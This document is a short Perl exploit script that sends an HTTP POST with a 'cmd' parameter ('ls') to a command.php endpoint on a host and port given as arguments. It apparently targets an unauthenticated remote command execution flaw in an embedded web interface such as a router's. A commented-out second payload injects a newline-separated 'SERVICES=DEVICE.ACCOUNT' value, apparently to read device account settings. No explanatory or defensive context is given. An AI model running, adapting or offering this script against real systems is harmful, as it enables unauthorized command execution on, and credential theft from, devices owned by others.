#!/usr/bin/env perl

use 5.018;
use strict;
use warnings;
use Mojo::UserAgent;

sub main {
    my $target = $ARGV[0];
    my $port   = $ARGV[1];

    if (($target) && ($port)) {
        my $endpoint = "http://$target:$port/command.php";
        
        my $payload  = {
            Cookie => "",
            cmd => "ls"
        };

        # my $payload  = "SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1";
        
        my $ua = Mojo::UserAgent -> new (
);

        my $response = $ua -> post ($endpoint, $payload);
        
        print $response -> content();
    }

    return 0;
}

main();
exit;